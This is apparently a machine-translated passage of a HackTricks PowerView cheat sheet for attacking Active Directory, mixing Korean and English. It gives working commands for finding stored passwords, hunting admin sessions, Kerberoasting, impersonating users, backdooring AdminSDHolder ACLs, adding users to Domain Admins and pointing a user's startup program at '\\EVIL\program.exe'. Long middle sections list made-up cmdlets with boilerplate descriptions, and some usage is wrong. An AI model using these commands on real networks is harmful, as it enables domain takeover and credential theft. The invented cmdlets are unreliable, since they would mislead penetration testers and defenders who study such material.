낮은 수준의 과일은 쉽게 접근 가능하고 적은 노력으로 얻을 수 있는 취약점을 의미합니다. 이러한 취약점은 주로 기본 보안 설정이나 약한 암호 등으로 인해 발생할 수 있습니다. 낮은 수준의 과일을 공격자는 쉽게 이용할 수 있으므로 시스템 보안을 강화하는 것이 중요합니다.
```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```
### 삭제된 객체

Deleted objects are objects in Active Directory that have been marked for deletion but have not yet been permanently removed. These objects can still be accessed and manipulated by an attacker, making them a potential security risk. PowerShell provides several commands in the PowerView module that can be used to interact with deleted objects in Active Directory.

#### Get-DomainDeletedObject

The `Get-DomainDeletedObject` command retrieves information about deleted objects in Active Directory. This includes the object's name, distinguished name (DN), object class, and when it was deleted. By default, this command retrieves all deleted objects in the current domain.

```powershell
Get-DomainDeletedObject
```

#### Restore-DomainObject

The `Restore-DomainObject` command can be used to restore a deleted object in Active Directory. This command requires the object's distinguished name (DN) as input.

```powershell
Restore-DomainObject -DN "CN=DeletedUser,OU=Users,DC=example,DC=com"
```

#### Remove-DomainObject

The `Remove-DomainObject` command permanently removes a deleted object from Active Directory. This command also requires the object's distinguished name (DN) as input.

```powershell
Remove-DomainObject -DN "CN=DeletedUser,OU=Users,DC=example,DC=com"
```

#### Get-DomainObjectAcl

The `Get-DomainObjectAcl` command retrieves the access control list (ACL) for a specified object in Active Directory. This command can be used to view the permissions assigned to a deleted object.

```powershell
Get-DomainObjectAcl -Identity "CN=DeletedUser,OU=Users,DC=example,DC=com"
```

By understanding how to interact with deleted objects in Active Directory using PowerShell, a pentester can identify and potentially exploit security vulnerabilities in an organization's infrastructure.
```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### 기타

#### SID를 이름으로 변환하기

```powershell
ConvertFrom-SID -SID <SID>
```

이 명령은 주어진 SID를 해당하는 계정 또는 그룹의 이름으로 변환합니다.

#### Name to SID

```powershell
ConvertTo-SID -Name <Name>
```

이 명령은 주어진 계정 또는 그룹의 이름을 해당하는 SID로 변환합니다.

#### Get Current User SID

```powershell
Get-CurrentUserSID
```

이 명령은 현재 사용자의 SID를 가져옵니다.

#### Get User SID

```powershell
Get-UserSID -Username <Username>
```

이 명령은 주어진 사용자의 SID를 가져옵니다.

#### Get Group SID

```powershell
Get-GroupSID -GroupName <GroupName>
```

이 명령은 주어진 그룹의 SID를 가져옵니다.

#### Get Domain SID

```powershell
Get-DomainSID
```

이 명령은 현재 도메인의 SID를 가져옵니다.

#### Get Domain SID History

```powershell
Get-DomainSIDHistory
```

이 명령은 현재 도메인의 SID 히스토리를 가져옵니다.

#### Get Domain Trusts

```powershell
Get-DomainTrust
```

이 명령은 현재 도메인의 신뢰 관계를 가져옵니다.

#### Get Domain Controllers

```powershell
Get-DomainController
```

이 명령은 현재 도메인의 도메인 컨트롤러를 가져옵니다.

#### Get Domain Forest

```powershell
Get-DomainForest
```

이 명령은 현재 도메인의 도메인 포레스트를 가져옵니다.

#### Get Domain Policy

```powershell
Get-DomainPolicy
```

이 명령은 현재 도메인의 도메인 정책을 가져옵니다.

#### Get Domain GPO

```powershell
Get-DomainGPO
```

이 명령은 현재 도메인의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO User

```powershell
Get-DomainGPOUser
```

이 명령은 현재 도메인의 사용자별 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Computer

```powershell
Get-DomainGPOComputer
```

이 명령은 현재 도메인의 컴퓨터별 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Group

```powershell
Get-DomainGPOGroup
```

이 명령은 현재 도메인의 그룹별 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Service

```powershell
Get-DomainGPOService
```

이 명령은 현재 도메인의 서비스별 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Site

```powershell
Get-DomainGPOSite
```

이 명령은 현재 도메인의 사이트별 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Domain

```powershell
Get-DomainGPODomain
```

이 명령은 현재 도메인의 도메인별 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO OU

```powershell
Get-DomainGPOOU
```

이 명령은 현재 도메인의 OU별 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Local

```powershell
Get-DomainGPOLocal
```

이 명령은 현재 도메인의 로컬 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom

```powershell
Get-DomainGPOCustom
```

이 명령은 현재 도메인의 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom User

```powershell
Get-DomainGPOCustomUser
```

이 명령은 현재 도메인의 사용자별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom Computer

```powershell
Get-DomainGPOCustomComputer
```

이 명령은 현재 도메인의 컴퓨터별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom Group

```powershell
Get-DomainGPOCustomGroup
```

이 명령은 현재 도메인의 그룹별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom Service

```powershell
Get-DomainGPOCustomService
```

이 명령은 현재 도메인의 서비스별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom Site

```powershell
Get-DomainGPOCustomSite
```

이 명령은 현재 도메인의 사이트별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom Domain

```powershell
Get-DomainGPOCustomDomain
```

이 명령은 현재 도메인의 도메인별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom OU

```powershell
Get-DomainGPOCustomOU
```

이 명령은 현재 도메인의 OU별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom Local

```powershell
Get-DomainGPOCustomLocal
```

이 명령은 현재 도메인의 로컬 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom All

```powershell
Get-DomainGPOCustomAll
```

이 명령은 현재 도메인의 모든 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom All User

```powershell
Get-DomainGPOCustomAllUser
```

이 명령은 현재 도메인의 모든 사용자별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom All Computer

```powershell
Get-DomainGPOCustomAllComputer
```

이 명령은 현재 도메인의 모든 컴퓨터별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom All Group

```powershell
Get-DomainGPOCustomAllGroup
```

이 명령은 현재 도메인의 모든 그룹별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom All Service

```powershell
Get-DomainGPOCustomAllService
```

이 명령은 현재 도메인의 모든 서비스별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom All Site

```powershell
Get-DomainGPOCustomAllSite
```

이 명령은 현재 도메인의 모든 사이트별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom All Domain

```powershell
Get-DomainGPOCustomAllDomain
```

이 명령은 현재 도메인의 모든 도메인별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom All OU

```powershell
Get-DomainGPOCustomAllOU
```

이 명령은 현재 도메인의 모든 OU별 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.

#### Get Domain GPO Custom All Local

```powershell
Get-DomainGPOCustomAllLocal
```

이 명령은 현재 도메인의 모든 로컬 사용자 정의 그룹 정책 객체(GPO)를 가져옵니다.
```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```
#### Kerberoast

Kerberoast는 암호화된 서비스 계정의 해시를 추출하는 기술입니다. 이 기술은 악의적인 사용자가 암호화된 서비스 계정의 해시를 획득하여 오프라인으로 공격할 수 있게 해줍니다. Kerberoast는 주로 서비스 계정의 암호를 크래킹하기 위해 사용됩니다.

Kerberoast는 주로 다음과 같은 단계로 수행됩니다:

1. 사용 가능한 서비스 계정 식별: Powerview를 사용하여 도메인 내에서 사용 가능한 서비스 계정을 식별합니다.
2. 서비스 계정의 SPN(서비스 주체 이름) 식별: Powerview를 사용하여 서비스 계정의 SPN을 식별합니다.
3. 서비스 계정의 해시 추출: Powerview를 사용하여 서비스 계정의 해시를 추출합니다.
4. 해시 크래킹: 추출한 해시를 오프라인으로 크래킹하여 암호를 파악합니다.

Kerberoast는 암호화된 서비스 계정의 해시를 획득하여 암호를 파악하는 강력한 기술입니다. 따라서 시스템 보안을 강화하기 위해 서비스 계정의 암호 정책을 강화하고, 사용하지 않는 서비스 계정을 비활성화하는 것이 중요합니다.
```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```
#### 다른 자격 증명 사용하기 (인자)

You can use different credentials when running PowerView commands by specifying the `-Credential` argument. This allows you to execute commands with the privileges of a different user.

```powershell
Get-NetUser -Credential <username>
```

Replace `<username>` with the username of the desired user. You will be prompted to enter the password for that user.

By using different credentials, you can gather information and perform actions that are restricted to specific users or groups. This can be useful for privilege escalation and lateral movement during a penetration test.
```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```
#### 사용자 위장

To impersonate a user in PowerShell, you can use the `Invoke-UserImpersonation` function from the PowerView module. This function allows you to execute commands as if you were the specified user.

```powershell
Invoke-UserImpersonation -Username <username> -Command <command>
```

Replace `<username>` with the username of the user you want to impersonate, and `<command>` with the command you want to execute as that user.

For example, to impersonate the user "admin" and execute the command "whoami", you would use the following command:

```powershell
Invoke-UserImpersonation -Username admin -Command whoami
```

This can be useful during a penetration test to perform actions as a specific user and test their privileges and access rights.
```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```
#### 값 설정하기

```powershell
Set-Value -Name <name> -Value <value>
```

- `<name>`: 설정할 값의 이름
- `<value>`: 설정할 값

이 명령은 지정된 이름과 값을 가진 변수를 설정합니다.
```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **해킹 트릭을 공유하려면 [hacktricks repo](https://github.com/carlospolop/hacktricks) 및 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하세요.

</details>
